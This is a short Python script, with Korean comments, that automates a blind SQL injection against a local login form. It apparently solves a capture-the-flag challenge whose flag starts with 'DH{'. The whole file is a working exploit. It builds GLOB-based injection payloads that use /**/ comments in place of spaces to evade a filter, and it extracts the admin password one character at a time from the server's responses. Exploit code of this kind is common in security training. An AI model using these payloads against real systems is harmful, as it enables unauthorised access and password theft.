import requests
import string

url = "http://127.0.0.1:5000/"
charset = string.ascii_letters + string.digits + "_{}"
flag = "DH{"

print(f"[*] 자동화 해킹 스크립트 가동. 타겟: {url}")
print(f"[*] 추출 시작...\n")

while True:
    found = False
    for char in charset:
        payload = f"admin'/**/and/**/upw/**/glob/**/'{flag}{char}*'/**/or/**/'1'='"
        data = {"userid": payload, "userpassword": "1"}
        
        response = requests.post(url, data=data)

        # 💡 [핵심 수정] 바뀐 예쁜 UI의 성공 메시지에 맞춰 대문자와 쉼표를 넣어줍니다.
        if "Hello, admin" in response.text:
            flag += char
            print(f"[+] Pwned! 현재 플래그: {flag}")
            found = True
            break 

    if not found:
        if flag.endswith("}"):
            break 
            
        print(f"[!] WAF 차단 의심. 해당 자리를 '?'로 우회하여 계속 탐색합니다.")
        flag += "?"

print(f"\n[🎉] 최종 플래그(비밀번호): {flag}")
